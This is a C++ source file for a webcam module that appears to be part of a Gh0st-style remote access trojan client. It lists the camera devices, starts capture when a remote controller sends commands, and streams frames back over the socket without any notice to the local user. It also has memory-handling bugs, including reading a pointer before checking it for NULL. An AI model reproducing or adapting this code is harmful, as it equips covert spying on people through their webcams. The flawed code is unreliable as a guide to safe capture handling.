#include "StdAfx.h"
#include "VideoManager.h"



CVideoManager::CVideoManager(ISocketBase*pClient) : CManager(pClient)
{
	m_buser = FALSE;
	m_pCapVideo = NULL;
 	m_bIsWorking = TRUE;
	m_bIsCompress = FALSE;
	m_nVedioWidth = 0;
	m_nVedioHeight = 0;
	m_nOldWidth = 320;
	m_nOldHeight = 240;
	m_fccHandler = 0;
	m_nDevicesNum = 0;
	m_SelectedDevice = 0;
	m_SelectedOld = 0;

 	m_hWorkThread = (HANDLE)_beginthreadex(NULL, 0,WorkThread, this, 0, NULL);
	m_buser = TRUE;
}

CVideoManager::~CVideoManager()
{
	if (!m_buser) return;
	InterlockedExchange((LPLONG)&m_bIsWorking, FALSE);
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
	if (m_pCapVideo)
	{	
		delete m_pCapVideo;
		m_pCapVideo = NULL;
	}
}

void CVideoManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == TOKEN_HEARTBEAT) return;
	switch (lpBuffer[0])
	{
	case COMMAND_NEXT_CWebCamDlg:
		NotifyDialogIsOpen();
		break;
	case COMMAND_WEBCAM_ENABLECOMPRESS: // 要求启用压缩
		{
			// 如果解码器初始化正常，就启动压缩功能
		}
		break;
	case COMMAND_WEBCAM_DISABLECOMPRESS:
		InterlockedExchange((LPLONG)&m_bIsCompress, FALSE);
		break;
	case COMMAND_WEBCAM_RESIZE:
		m_SelectedDevice = *((LPDWORD)(lpBuffer + 9));
		ResetScreen(*((LPDWORD)(lpBuffer + 1)), *((LPDWORD)(lpBuffer + 5)));
		break;


	default:	
		break;
	}	
}

void CVideoManager::sendBITMAPINFO()
{
	DWORD	dwBytesLength = (DWORD)(1 + sizeof(BITMAPINFO) + sizeof(int) + m_DeviceList.length());
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL || m_pCapVideo == NULL)
		return;

	lpBuffer[0] = TOKEN_WEBCAM_BITMAPINFO;

	memcpy(lpBuffer + 1, m_pCapVideo->m_lpbmi, sizeof(BITMAPINFO));
	memcpy(lpBuffer + 1 + sizeof(BITMAPINFO),&m_nDevicesNum,sizeof(int));
	memcpy(lpBuffer + 1 + sizeof(BITMAPINFO) + sizeof(int),m_DeviceList.c_str(),m_DeviceList.length());
	Send(lpBuffer, dwBytesLength);


	delete [] lpBuffer;		
}

void CVideoManager::sendNextScreen()
{
	LPVOID	lpDIB = m_pCapVideo->GetDIB();
	unsigned char* pPos = (unsigned char*)lpDIB;
	int *p_len = (int*)lpDIB;
	int len = *p_len;
	if (lpDIB == NULL)
	{
		return;
	}
	// token + IsCompress + m_fccHandler + DIB
	int		nHeadLen = 1 + 1 + 4;
	
	UINT	nBufferLen = nHeadLen + len;
	
	LPBYTE	lpBuffer = new BYTE[nBufferLen];
	memset(lpBuffer,0,nBufferLen);
	if (lpBuffer == NULL)
		return;
	m_fccHandler = 1324;
	lpBuffer[0] = TOKEN_WEBCAM_DIB;
	m_bIsCompress = FALSE;
	lpBuffer[1] = m_bIsCompress;
	memcpy(lpBuffer + 2, &m_fccHandler, sizeof(DWORD));
	
	UINT	nPacketLen = 0;
	{
		memcpy(lpBuffer + nHeadLen, pPos + 4, len);
		nPacketLen = len + nHeadLen;
	}
	Send(lpBuffer, nPacketLen);
	delete [] lpDIB;
	delete [] lpBuffer;

}

void CVideoManager::ResetScreen(int nWidth, int nHeight)
{
	InterlockedExchange((LPLONG)&m_bIsWorking, FALSE);
	WaitForSingleObject(m_hWorkThread, INFINITE);
	// 更新视频大小
	m_nVedioWidth = nWidth;
	m_nVedioHeight = nHeight;

	InterlockedExchange((LPLONG)&m_bIsWorking, TRUE);
	m_hWorkThread = (HANDLE)_beginthreadex(NULL, 0, WorkThread, this, 0, NULL);
}
void CVideoManager::StartCapture()
{
    if(m_pCapVideo)
    {
        m_pCapVideo->GrabVideoFrames(TRUE,m_pCapVideo);
    }
}
unsigned CVideoManager::WorkThread( LPVOID lparam )
{
	static	DWORD dwLastScreen = GetTickCount();
	CVideoManager *pThis = (CVideoManager *)lparam;
	if (!pThis->Initialize())
	{
		pThis->Destroy();
		pThis->m_pClient->Disconnect();
		return -1;
    }
	pThis->sendBITMAPINFO();
	// 等控制端对话框打开
	pThis->WaitForDialogOpen();
    pThis->StartCapture();
	while (pThis->m_bIsWorking)
	{
		pThis->sendNextScreen();
	}
	// 销毁已经存在实例，方便重新调整
	pThis->Destroy();
	return 0;
}

bool CVideoManager::Initialize()
{
	bool	bRet = false;
//	CoInitialize(NULL);
	if (m_pCapVideo == NULL)
	{
		m_pCapVideo = new CCaptureVideo();
	}
    if (m_pCapVideo == NULL)
    {
        return false;
    }
	m_DeviceList = "";
	DeviceInfo devInfo;
	if (0 >= (m_nDevicesNum = m_pCapVideo->EnumDevices(&devInfo)))
	{
		delete m_pCapVideo;
		m_pCapVideo = NULL;
		return false;
	}
	DeviceInfo* pInfo = &devInfo;
	while(pInfo)
	{
		m_DeviceList += pInfo->friendlyName.GetBuffer();
		m_DeviceList += "#";
		ResolutionInfo* pResInfo = pInfo->resInfo;
		while(pResInfo)
		{
			m_DeviceList+=pResInfo->Resolution.GetBuffer();
			pResInfo = pResInfo->next;
		}
		m_DeviceList+="$";
		pInfo = pInfo->next;
	}
	if (m_nVedioWidth && m_nVedioHeight)
	{
		if (S_OK != m_pCapVideo->Start(m_SelectedDevice,NULL,m_nVedioWidth,m_nVedioHeight))
		{
			m_pCapVideo->Stop();
			m_pCapVideo->Start(m_SelectedOld,NULL,m_nOldWidth,m_nOldHeight);
			return true;
		}
	}
	else
	{
		m_nOldWidth = m_nVedioWidth = 320;
		m_nOldHeight = m_nVedioHeight = 240;
		if (S_OK != m_pCapVideo->Start(m_SelectedDevice,NULL,320,240))
		{
			m_pCapVideo->Stop();
			for(int i = 0;i < m_nDevicesNum;i++)
			{
				if(S_OK == m_pCapVideo->Start(i,NULL,320,240))
				{
					m_SelectedDevice = i;
					m_SelectedOld = i;
					m_nOldWidth = m_nVedioWidth = 320;
					m_nOldHeight = m_nVedioHeight = 240;
					return true;
				}
				m_pCapVideo->Stop();
			}
			return false;
		}
	}

	m_nOldWidth = m_nVedioWidth;
	m_nOldHeight = m_nVedioHeight;

	m_SelectedOld = m_SelectedDevice;
	bRet = true;
	return bRet;
}

void CVideoManager::Destroy()
{
	if (m_pCapVideo)
	{
		m_pCapVideo->GrabVideoFrames(FALSE);
		m_pCapVideo->Stop();	
        delete m_pCapVideo;
        m_pCapVideo = NULL;
	}
	
}
